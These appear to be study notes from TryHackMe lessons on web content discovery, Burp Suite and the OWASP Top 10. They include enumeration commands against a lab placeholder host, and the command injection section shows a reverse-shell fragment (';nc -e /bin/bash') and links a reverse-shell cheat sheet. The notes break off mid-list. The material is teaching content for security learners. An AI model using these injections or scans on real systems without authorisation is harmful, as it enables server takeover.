<p>If you run the following command on the AttackBox, it will download the favicon and get its md5 hash value which you can then lookup on the<br><a href="https://wiki.owasp.org/index.php/OWASP_favicon_database">https://wiki.owasp.org/index.php/OWASP_favicon_database</a>.</p>
<p>&nbsp;</p>
<p>user@machine<strong>$</strong>&nbsp;curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico&nbsp;| md5sum</p>
<p>&nbsp;</p>
<h2>Sitemap.xml</h2>
<p>Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.</p>
<p>&nbsp;</p>
<h2>HTTP Headers</h2>
<p>When we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. In the below example, we can see the webserver is NGINX version 1.18.0 and runs PHP version 7.4.3. Using this information, we could find vulnerable versions of software being used. Try running the below curl command against the web server, where the&nbsp;<strong>-v</strong>&nbsp;switch enables verbose mode, which will output the headers (there might be something interesting!).</p>
<p><br><br>&nbsp;</p>
<p>curl</p>
<p>user@machine<strong>$</strong>&nbsp;curl http://MACHINE_IP -v<br>*&nbsp; &nbsp;Trying MACHINE_IP:80...<br>* TCP_NODELAY set<br>* Connected to MACHINE_IP (MACHINE_IP) port 80 (#0)<br>&gt; GET / HTTP/1.1<br>&gt; Host: MACHINE_IP<br>&gt; User-Agent: curl/7.68.0<br>&gt; Accept: */*</p>
<p>&gt;&nbsp;</p>
<p>* Mark bundle as not supporting multiuse</p>
<p>&lt; HTTP/1.1 200 OK<br>&lt; Server: nginx/1.18.0 (Ubuntu)<br>&lt; X-Powered-By: PHP/7.4.3<br>&lt; Date: Mon, 19 Jul 2021 14:39:09 GMT<br>&lt; Content-Type: text/html; charset=UTF-8<br>&lt; Transfer-Encoding: chunked<br>&lt; Connection: keep-alive</p>
<p>&nbsp;</p>
<h2>Framework stack</h2>
<p>Once you've established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework's website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.</p>
<p>&nbsp;</p>
<h2>OSINT: Google</h2>
<p>There are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they're freely available tools that collect information:</p>
<p>&nbsp;</p>
<p><strong>Google Hacking / Dorking</strong></p>
<p>Google hacking / Dorking utilizes Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the&nbsp;<strong>site:</strong>&nbsp;filter, for example (site:<a href="http://tryhackme.com/">tryhackme.com</a>) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the&nbsp;<a href="http://tryhackme.com/">tryhackme.com</a>&nbsp;website which contain the word admin in its content. You can combine multiple filters as well. Here is an example of more filters you can use:</p>
<figure class="table" style="width:100.0%;">
  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
    <tbody>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Filter</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Example</strong></td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong>Description</strong></td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">site</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">site:tryhackme.com</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">returns results only from the specified website address</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">inurl</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">inurl:admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">returns results that have the specified word in the URL</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">filetype</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">filetype:pdf</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">returns results which are a particular file extension</td>
      </tr>
      <tr>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">intitle</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">intitle:admin</td>
        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">returns results that contain the specified word in the title</td>
      </tr>
    </tbody>
  </table>
</figure>
<p><br><br>&nbsp;</p>
<p>More information about google hacking can be found here:&nbsp;<a href="https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</a></p>
<p>&nbsp;</p>
<h2>OSINT: Wappalyzer</h2>
<p>Wappalyzer (<a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a>) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.</p>
<h2>OSINT: Wayback machine</h2>
<p>The Wayback Machine (<a href="https://archive.org/web/">https://archive.org/web/</a>) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.</p>
<p>&nbsp;</p>
<h2>OSINT: Github</h2>
<p>To understand GitHub, you first need to understand Git. Git is a&nbsp;<strong>version control system</strong>&nbsp;that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.</p>
<p>&nbsp;</p>
<h2>OSINT: S3 buckets</h2>
<p>S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://<strong>{name}.</strong><a href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a>&nbsp;where {name} is decided by the owner, such as&nbsp;<a href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>. S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as&nbsp;<strong>{name}</strong>-assets,&nbsp;<strong>{name}</strong>-www,&nbsp;<strong>{name}</strong>-public,&nbsp;<strong>{name}</strong>-private, etc.</p>
<p>&nbsp;</p>
<h2>Automated discovery (FFUF, dirb, gobuster)</h2>
<p>Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists.</p>
<p>&nbsp;</p>
<p><strong>What are wordlists?</strong></p>
<p>Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is&nbsp;<a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>&nbsp;which Daniel Miessler curates.</p>
<p>&nbsp;</p>
<p><strong>Automation Tools</strong></p>
<p>Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.</p>
<p><br><br>&nbsp;</p>
<p>On the AttackBox execute the following three commands, targeting the Acme IT Support website and see what results you get.</p>
<p>&nbsp;</p>
<p><strong>Using ffuf:</strong></p>
<p>ffuf</p>
<p>user@machine</p>
<p><strong>$</strong></p>
<p>&nbsp;ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://MACHINE_IP/FUZZ</p>
<p>Using dirb:</p>
<p>dirb</p>
<p>user@machine</p>
<p><strong>$</strong></p>
<p>&nbsp;dirb http://MACHINE_IP/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</p>
<p>Using Gobuster:</p>
<p>gobuster</p>
<p>user@machine</p>
<p><strong>$</strong></p>
<p>&nbsp;gobuster&nbsp;dir --url http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</p>
<p>&nbsp;</p>
<h2>&nbsp;</h2>
<h1>Burpsuite</h1>
<p>Web application pentesting can be a messy affair but Burp has something for every step of the way.&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image023.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><br><a href="https://dribbble.com/shots/4887261-Tools"><i>Tools by Ana Miminoshvili on Dribbble</i></a></p>
<p>Throughout this room, we'll be taking a look at these components of Burp Suite. Here's a quick overview of each section covered:</p>
<p><strong>Proxy</strong>&nbsp;- What allows us to funnel traffic through Burp Suite for further analysis</p>
<p><strong>Target</strong>&nbsp;- How we set the scope of our project. We can also use this to effectively create a site map of the application we are testing.</p>
<p><strong>Intruder</strong>&nbsp;- Incredibly powerful tool for everything from field fuzzing to credential stuffing and more</p>
<p><strong>Repeater</strong>&nbsp;-&nbsp;Allows us to 'repeat' requests that have previously been made with or without modification. Often used in a precursor step to fuzzing with the aforementioned Intruder</p>
<p><strong>Sequencer</strong>&nbsp;- Analyzes the 'randomness' present in parts of the web app which are intended to be unpredictable. This is commonly used for testing session cookies</p>
<p><strong>Decoder</strong>&nbsp;-&nbsp;As the name suggests, Decoder is a tool that allows us to perform various transforms on pieces of data. These transforms vary from decoding/encoding to various bases or URL encoding.</p>
<p><strong>Comparer</strong>&nbsp;-&nbsp;Comparer as you might have guessed is a tool we can use to compare different responses or other pieces of data such as site maps or proxy histories (awesome for access control issue testing). This is very similar to the&nbsp;Linux&nbsp;tool diff.</p>
<p><strong>Extender</strong>&nbsp;-&nbsp;Similar to adding mods to a game like Minecraft, Extender allows us to add components such as tool integrations, additional scan definitions, and more!</p>
<p><strong>Scanner</strong>&nbsp;-&nbsp;Automated web vulnerability scanner that can highlight areas of the application for further manual investigation or possible exploitation with another section of Burp. This feature, while not in the community edition of Burp Suite, is still a key facet of performing a web application test.</p>
<p>&nbsp;</p>
<h2>Proxy</h2>
<p>Generally speaking, proxy servers by definition allow us to relay our traffic through an alternative route to the internet. This can be done for a variety of reasons ranging from educational filtering (common in schools where restricted content must be blocked) to accessing content that may be otherwise unavailable due to region locking or a ban. Using a proxy, however, for web application testing allows us to view and modify traffic inline at a granular level. Throughout this task, we'll explore the major components of the Burp proxy including interception, request history, and the various configuration options we have access to.&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image025.png" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><i>Basic diagram of how communications are relayed through a proxy -&nbsp;</i><a href="https://en.wikipedia.org/wiki/Proxy_server"><i>Wikipedia - Proxy Servers</i></a></p>
<p>In task three, Gettin' [CA] Certified, we configured our web traffic to route through our instance of Burp Suite. By default, Burp will be set to 'intercept' our traffic. This means a few things:</p>
<p>1. Requests will by default require our authorization to be sent.</p>
<p>2. We can modify our requests in-line similar to what you might see in a man-in-the-middle attack and then send them on.</p>
<p>3. We can also drop requests we don't want to be sent. This can be useful to see the request attempt after clicking a button or performing another action on the website.&nbsp;</p>
<p>4. And last but not least, we can send these requests to other tools such as Repeater and Intruder for modification and manipulation to induce vulnerabilities.&nbsp;</p>
<p><i>Burp Suite reference documentation for Proxy:&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/proxy"><i>Link</i></a></p>
<p>&nbsp;</p>
<h2>Target definition</h2>
<p>Perhaps the most important feature in Burp Suite, we'll now be turning our focus to the Target tab!</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image027.jpg" alt="Afbeelding met tekst, geel, geschilderd

Automatisch gegenereerde beschrijving"></figure>
<p><br><a href="https://dribbble.com/shots/2363233-Lock-On-Target"><i>Lock on Target by&nbsp;Alexei Vella on Dribbble</i></a></p>
<p>The Target tab in Burp allows us to perform arguably some of the most important parts of a web application penetration test: defining our scope, viewing a site map, and specifying our issue definitions (although this is more useful within report generation and scanning).&nbsp;</p>
<p>When starting a web application test you'll very likely be provided a few things:</p>
<p>- The application URL (hopefully for dev/test and not prod)<br>- A list of the different user roles within the application<br>- Various test accounts and associated credentials for those accounts<br>- A list of pieces/forms in the application which are out-of-scope for testing and should be avoided</p>
<p>From this information, we can now start to build our scope within Burp, something which is incredibly important in the case we are planning on performing any automated testing. Typically this is done in a tiered approach wherein we work our way up from the lowest privileged account (this includes unauthenticated access), browsing the site as a normal user would. Browsing like this to discover the full extent of the site is commonly referenced as the 'happy path'. Following the creation of a site map via browsing the happy path, we can go through and start removing various items from the scope. These items typically fit one of these criteria:</p>
<p>- The item (page, form, etc) has been designated as out of scope in the provided documentation from the client<br>- Automated exploitation of the item (especially in a credentialed manner) would cause a huge mess (like sending hundreds of password reset emails - If you've done a web app professionally you've probably done this at one point)<br>- Automated exploitation of the item (especially in a credentialed manner) would lead to damaging and potentially crashing the web app</p>
<p>Once we've removed any restricted or otherwise potentially dangerous items from our scope, we can move onto other areas of testing with the various tools within Burp Suite.</p>
<p><i>Burp Suite reference documentation for Target:&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/target"><i>Link</i></a></p>
<p>&nbsp;</p>
<h2>Repeater</h2>
<p>As the name suggests, Repeater allows us to repeat requests we've already made. These requests can either be reissued as-is or with modifications. In contrast to Intruder, Repeater is typically used for the purposes of experimentation or more fine-tuned exploitation wherein automation may not be desired. We'll be checking out Repeater with the goal of finding a proof of concept demonstrating that Juice Shop is vulnerable to SQL injection.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image029.jpg" alt="Afbeelding met elektronica, luidspreker

Automatisch gegenereerde beschrijving"></figure>
<p><br><a href="https://dribbble.com/shots/10090741-Record-Player"><i>Record Player by Briton Baker on Dribbble</i></a></p>
<p><i>Burp Suite reference documentation for Repeater:&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/repeater"><i>Link</i></a></p>
<p>&nbsp;</p>
<h2>Intruder</h2>
<p>Arguably the most powerful tool in Burp Suite, Intruder can be used for many things ranging from fuzzing to brute-forcing. At its core, Intruder serves one purpose: automation.&nbsp;</p>
<p>While Repeater best handles experimentation or one-off testing, Intruder is meant for repeat testing once a proof of concept has been established. Per the&nbsp;<a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/using">Burp Suite documentation</a>, some common uses are as follows:</p>
<p>- Enumerating identifiers such as usernames, cycling through predictable session/password recovery tokens, and attempting simple password guessing<br>- Harvesting useful data from user profiles or other pages of interest via grepping our responses<br>- Fuzzing for vulnerabilities such as SQL injection, cross-site scripting (XSS), and file path traversal</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image031.jpg" alt="Afbeelding met donker

Automatisch gegenereerde beschrijving"></figure>
<p><br><a href="https://dribbble.com/shots/2384392-The-Overcoat-Nikolai-Gogol-Illustration"><i>The Overcoat by Chill Desk on Dribbble</i></a></p>
<p>To accomplish these various use cases, Intruder has&nbsp;<a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/positions">four</a>&nbsp;different attack types:</p>
<p>1.&nbsp;<i>Sniper</i>&nbsp;- The most popular attack type, this cycles through our selected positions, putting the next available payload (item from our wordlist) in each position in turn. This uses only one set of payloads (one wordlist).</p>
<p>2.&nbsp;<i>Battering Ram</i>&nbsp;- Similar to Sniper, Battering Ram uses only one set of payloads. Unlike Sniper, Battering Ram puts every payload into every selected position. Think about how a battering ram makes contact across a large surface with a single surface, hence the name battering ram for this attack type.</p>
<p>3.&nbsp;<i>Pitchfork</i>&nbsp;- The Pitchfork attack type allows us to use multiple payload sets&nbsp;(one per position selected)&nbsp;and iterate through both payload sets&nbsp;<i>simultaneously</i>. For example, if we selected two positions (say a username field and a password field), we can provide a username and password payload list. Intruder will then cycle through the combinations of usernames and passwords, resulting in a total number of combinations equalling the smallest payload set provided.<i>&nbsp;</i></p>
<p>4.&nbsp;<i>Cluster Bomb</i>&nbsp;-&nbsp;The Cluster Bomb attack type allows us to use multiple payload sets&nbsp;(one per position selected)&nbsp;and iterate through all combinations of the payload lists we provide. For example, if we selected two positions (say a username field and a password field), we can provide a username and password payload list. Intruder will then cycle through the combinations of usernames and passwords, resulting in a total number of combinations equalling usernames x passwords.&nbsp;<i>Do note, this can get pretty lengthy if you are using the community edition of Burp.&nbsp;</i></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image033.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><br><i>Intruder Attack Type Selection</i></p>
<p>For our purposes, we'll be returning to the SQL injection vulnerability we previously discovered through using Repeater.&nbsp;</p>
<p><i>Burp Suite reference documentation for Intruder:&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/intruder"><i>Link</i></a></p>
<p>&nbsp;</p>
<h2>Decoder and Comparer</h2>
<p>Decoder and Comparer, while lesser tools within Burp Suite, are still essential to understand and leverage as part of being a proficient web app tester.&nbsp;</p>
<p>As the name suggests, Decoder is a tool that allows us to perform various transforms on pieces of data. These transforms vary from decoding/encoding to various bases or URL encoding. We chain these transforms together and Decoder will automatically spawn an additional tier each time we select a decoder, encoder, or hash.<i>&nbsp;This tool ultimately functions very similarly to&nbsp;</i><a href="https://gchq.github.io/CyberChef/"><i>CyberChef</i></a><i>, albeit slightly less powerful.</i></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image035.jpg"></figure>
<p><br><a href="https://dribbble.com/shots/6549514-Encryption"><i>Encryption by Muriel on Dribbble</i></a></p>
<p>Similarly, Comparer, as you might have guessed is a tool we can use to compare different responses or other pieces of data such as site maps or proxy histories (awesome for access control issue testing). This is very similar to the&nbsp;Linux&nbsp;tool diff.</p>
<p>Per the Burp&nbsp;<a href="https://portswigger.net/burp/documentation/desktop/tools/comparer">documentation</a>, some common uses for Comparer are as follows:</p>
<p>- When looking for username enumeration conditions, you can compare responses to failed logins using valid and invalid usernames, looking for subtle differences in responses.&nbsp;<i>This is also sometimes useful for when enumerating password recovery forms or another similar recovery/account access mechanism.&nbsp;</i></p>
<p>- When an Intruder attack has resulted in some very large responses with different lengths than the base response, you can compare these to quickly see where the differences lie.</p>
<p>- When comparing the site maps or Proxy history entries generated by different types of users, you can compare pairs of similar requests to see where the differences lie that give rise to different application behavior. This may reveal possible access control issues in the application wherein lower privileged users can access pages they really shouldn't be able to.</p>
<p>- When testing for blind SQL injection bugs using Boolean condition injection and other similar tests, you can compare two responses to see whether injecting different conditions has resulted in a relevant difference in responses.</p>
<p><i>*These examples are taken nearly in their entirety from the Burp docs simply to provide a broader set of examples to consider when using Comparer.</i></p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image037.jpg" alt="Afbeelding met LEGO, speelgoed

Automatisch gegenereerde beschrijving"></figure>
<p><br><a href="https://dribbble.com/shots/3551926-JavaScript-Arrays-in-Depth"><i>JavaScript Arrays in Depth by Maxime Bourgeois on Dribbble</i></a></p>
<p><i>Burp Suite reference documentation for&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/decoder"><i>Decoder</i></a><i>&nbsp;and&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/comparer"><i>Comparer</i></a></p>
<p>&nbsp;</p>
<h2>Mods</h2>
<p>Similar to adding mods to a game like Minecraft, Extender allows us to add components such as tool integrations, additional scan definitions, and more! Here are some of the most popular extensions I suggest checking out (not all of these are free but I suggest looking into them all the same):</p>
<p><a href="https://portswigger.net/bappstore/470b7057b86f41c396a97903377f3d81">Logger++</a>&nbsp;- Adds enhanced logging to all requests and responses from all Burp Suite tools, enable this one before you need it ;)</p>
<p><a href="https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646">Request Smuggler</a>&nbsp;- A relatively new extension, this allows you to attempt to smuggle requests to backend servers. See this talk by James Kettle for more details:&nbsp;<a href="https://www.youtube.com/watch?v=_A04msdplXs">Link</a></p>
<p><a href="https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f">Autorize</a>&nbsp;- Useful for authentication testing in web app tests. These tests typically revolve around navigating to restricted pages or issuing restricted GET requests with the session cookies of low-privileged users</p>
<p><a href="https://github.com/Static-Flow/BurpSuite-Team-Extension">Burp Teams Server</a>&nbsp;- Allows for collaboration on a Burp project amongst team members. Project details are shared in a chatroom-like format</p>
<p><a href="https://portswigger.net/bappstore/36238b534a78494db9bf2d03f112265c">Retire.js</a>&nbsp;- Adds scanner checks for outdated JavaScript libraries that contain vulnerabilities, this is a premium extension</p>
<p><a href="https://portswigger.net/bappstore/7ec6d429fed04cdcb6243d8ba7358880">J2EEScan</a>&nbsp;- Adds scanner test coverage for J2EE (java platform for web development) applications, this is a premium extension</p>
<p><a href="https://portswigger.net/bappstore/56675bcf2a804d3096465b2868ec1d65">Request Timer</a>&nbsp;- Captures response times for requests made by all Burp tools, useful for discovering timing attack vectors&nbsp;</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image039.jpg" alt="Afbeelding met tekst, schrijfgerei, kantoorartikelen

Automatisch gegenereerde beschrijving"></figure>
<p><br><a href="https://dribbble.com/shots/3870703-Contributing"><i>Contributing by Matt Scribner on Dribbble</i></a></p>
<p>A prerequisite for many of the extensions offered for Burp, we'll walk through the installation of Jython, the Java implementation of Python.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image041.png"></figure>
<p><i>Burp Suite reference documentation for Extender:&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/extender"><i>Link</i></a></p>
<p><i>Article on some of the top extensions for Burp Suite:&nbsp;</i><a href="https://portswigger.net/testers/penetration-testing-tools"><i>Link</i></a></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>Scanner and Collaborator</h2>
<p>Arguably the most powerful feature in Burp Suite, the Burp Suite Scanner allows us to passively and actively scan and spider the website we are testing for vulnerabilities. In Burp 2.0's task-based model, we can launch these scans (Scanner and Spider) from the dashboard and let them run in the background while we continue to examine the web app. In this case, I've run an unauthenticated scan against Juice Shop and have attached it to this task. These reports can provide a starting place for further enumeration and exploitation via the other tools in Burp Suite.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image043.jpg"></figure>
<p><i>A Preview of the Report Attached to this Task Created with Burp Professional</i></p>
<p>Commonly used in manual tests, Burp Collaborator Client allows us to gain insight into issues that may otherwise seem to produce no output. Often during testing, we may come across items which, either due to timing/slowness of the web app or a lack of any reaction, are likely vulnerable but don't produce any sure-fire indicators. With Burp Collaborator, however, we can produce out-of-band alerts via generating payloads that reach back to Burp Suite's servers for us.</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image045.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p><i>Burp Suite reference documentation for&nbsp;</i><a href="https://portswigger.net/burp/documentation/scanner"><i>Scanner</i></a><i>&nbsp;and&nbsp;</i><a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator-client"><i>Collaborator Client</i></a></p>
<p>&nbsp;</p>
<h1>&nbsp;</h1>
<p>&nbsp;</p>
<h1>OWASP top 10</h1>
<ul>
  <li>Injection</li>
  <li>Broken Authentication</li>
  <li>Sensitive Data Exposure</li>
  <li>XML&nbsp;External Entity</li>
  <li>Broken Access Control</li>
  <li>Security Misconfiguration</li>
  <li>Cross-site Scripting</li>
  <li><strong>I</strong>nsecure Deserialization</li>
  <li>Components with Known Vulnerabilities</li>
  <li>Insufficent Logging &amp; Monitoring</li>
</ul>
<h2>&nbsp;</h2>
<h2>Injections</h2>
<p>Injection flaws are very common in applications today. These flaws occur because user controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:</p>
<p>SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.&nbsp;</p>
<p>Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.</p>
<p>&nbsp;</p>
<p>If an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:</p>
<p>Access, Modify and Delete information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.</p>
<p>Execute Arbitrary system commands on a server that would allow an attacker to gain access to users systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.</p>
<p>&nbsp;</p>
<p>The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands. There are different ways of doing this:</p>
<p>Using an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.</p>
<p>Stripping input: If the input contains dangerous characters, these characters are removed before they are processed.</p>
<p>&nbsp;</p>
<p>Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or even just stripping input, there are various libraries that perform these actions for you.</p>
<p>&nbsp;</p>
<h3>OS Command Injection</h3>
<p>Command Injection occurs when server-side code (like&nbsp;PHP) in a web application makes a system call on the hosting machine.&nbsp; It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.&nbsp; Sometimes this won't always end in something malicious, like a&nbsp;<code>whoami</code>&nbsp;or just reading of files.&nbsp; That isn't too bad.&nbsp; But the thing about command injection is it opens up many options for the attacker.&nbsp; The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as.&nbsp; A simple&nbsp;<code>;nc -e /bin/bash</code>&nbsp;is all that's needed and they own your server;&nbsp;<strong>some variants of netcat don't support the -e option.&nbsp;</strong>You can use a list of&nbsp;<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">these</a>&nbsp;reverse shells as an alternative.<strong>&nbsp;</strong></p>
<p>Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around.&nbsp; Now that we know what command injection is, we'll start going into the different types and how to test for them.</p>
<p>&nbsp;</p>
<p>What is Active Command Injection?</p>
<p>Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.&nbsp; Active command injection will return the response to the user.&nbsp; It can be made visible through several HTML elements.&nbsp;</p>
<p>Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.&nbsp; It's nowhere near finished but contains the same command injection vulnerability as before!&nbsp; But this time, the response from the system call can be seen on the page!&nbsp; They'll never learn!</p>
<p>Just like before, let's look at the sample code from evilshell.php and go over what it's doing and why it makes it active command injection.&nbsp; See if you can figure it out.&nbsp; I'll go over it below just as before.</p>
<p>EvilShell (evilshell.php) Code Example</p>
<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Packages/oice_16_974fa576_32c1d314_2861/AC/Temp/msohtmlclip1/01/clip_image047.jpg" alt="Afbeelding met tekst

Automatisch gegenereerde beschrijving"></figure>
<p>In pseudocode, the above snippet is doing the following:</p>
<p>1. Checking if the parameter "commandString" is set</p>
